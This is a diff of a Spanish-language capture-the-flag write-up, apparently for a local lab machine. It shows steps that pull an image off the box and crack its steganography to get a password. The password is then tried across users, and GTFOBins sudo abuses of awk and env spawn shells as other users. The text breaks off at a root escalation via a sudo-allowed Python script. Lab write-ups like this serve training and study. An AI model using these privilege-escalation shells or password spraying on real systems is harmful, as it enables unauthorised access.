@@ -107,7 +107,7 @@ y ejecutando
 
 Vemos que las credenciales del usuario fernando son: ```fernando:chocolate``` por lo que ahora podemos acceder.
 
-## Paso N8: Accediendo a usuario x
+## Paso N8: Descubriendo credenciales
 Una vez ya dentro del usuario ```fernando``` podemos ver que en su ```/home/fernando``` hay una imágen, por lo que la pasamos a la máquina atacante abriendo un servidor 
 ```
 python3 -m http.server 8000
@@ -121,5 +121,44 @@ wget http://172.17.0.2:8000/dragon-medieval.jpeg
 y una vez la tengamos en n uestra máquina, usaremos ```stegcracker```
 <img width="665" height="305" alt="image" src="https://github.com/user-attachments/assets/6b9a639b-4e88-4589-87b5-99d567f45013" />
 
-Esto nos dejará ```dragon-medieval.jpeg.out``` el cual tiene un hash, cual contenido es:
+Esto nos dejará ```dragon-medieval.jpeg.out``` dentro tiene un hash, cual contenido es:
+<img width="1253" height="95" alt="image" src="https://github.com/user-attachments/assets/a8e44146-8d1f-4f84-a5ca-24de77a50347" />
+```
+password123
+```
+
+## Paso N9: Accediendo a usuarios
+Una vez ya tenemos la contraseña de uno de los usuarios, probaremos la contraseña en cada uno
+<img width="331" height="205" alt="image" src="https://github.com/user-attachments/assets/d5fa21df-78d1-4017-8486-fea4ffc7a9a3" />
+
+Y vemos que podemos acceder a mario.
+
+Dentro de usuario mario, ejecutaremos ```sudo -l``` y veremos
+<img width="669" height="156" alt="image" src="https://github.com/user-attachments/assets/5320a462-8680-4877-84f6-f01fa709d6d2" />
+```
+(julen) NOPASSWD: /usr/bin/awk
+```
+De acuerdo con GTFObins, ejecutamos 
+```
+sudo -u julen awk 'BEGIN {system("/bin/sh")}'
+```
+
+y entramos al usuario julen, el cual nuevamente hacemos ```sudo -l```
+<img width="672" height="264" alt="image" src="https://github.com/user-attachments/assets/5ed793ae-0c5e-4385-a456-f0d8b4fcdd24" />
+```
+(iker) NOPASSWD: /usr/bin/env
+```
+Nuevamente, de acuerdo a GTFObins, ejecutamos 
+```
+sudo -u iker env /bin/sh -p
+```
+y accedemos al usuario iker.
+
+## Paso N10: escalando privilegios
+Una vez ya como usuario iker, podemos ejecutar ```sudo -l```
+<img width="670" height="174" alt="image" src="https://github.com/user-attachments/assets/3a3302e3-b759-46b1-946b-ff85998035a4" />
+```
+(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
+```
+podemos ver que en el directorio ```/home/iker/``` hay un script de python el cual 
 
